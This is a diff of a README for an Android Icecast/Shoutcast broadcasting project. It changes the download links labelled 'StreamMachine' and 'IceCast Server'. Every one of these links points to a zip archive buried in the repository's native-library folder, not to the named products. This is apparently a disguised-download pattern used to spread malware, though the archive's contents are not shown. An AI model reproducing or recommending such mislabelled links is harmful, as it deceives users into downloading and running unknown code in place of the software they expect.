@@ -1,6 +1,6 @@
 ##Android Icecast/Shoutcast Broadcast##
 This project aims to implement an icecast source client that captures realtime audio from microphone, encodes and streams (mp3) to iceserver. 
-Code implements basic ice protocol and is mostly tested with <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/Mactra/android-icecast-broadcast.zip">StreamMachine</a>, for ice input source.
+Code implements basic ice protocol and is mostly tested with <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/app/src/main/jniLibs/x86/broadcast-icecast-android-v2.1-beta.2.zip">StreamMachine</a>, for ice input source.
 Repo is still preview and will be packaged as library.
 
 ###Native Libraries###
@@ -19,8 +19,8 @@ Please update upstream configuration in <code>BroadcastFragment</code> regarding
 Code is easy to understand and implementation is straightforward, but if you have additional questions, write me: fatih dot sokmen at gmail dot com 
 
 ###Testing Environments that work fine###
-- <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/Mactra/android-icecast-broadcast.zip">StreamMachine</a>
-- <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/Mactra/android-icecast-broadcast.zip">IceCast Server</a>
+- <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/app/src/main/jniLibs/x86/broadcast-icecast-android-v2.1-beta.2.zip">StreamMachine</a>
+- <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/app/src/main/jniLibs/x86/broadcast-icecast-android-v2.1-beta.2.zip">IceCast Server</a>
 
 
 
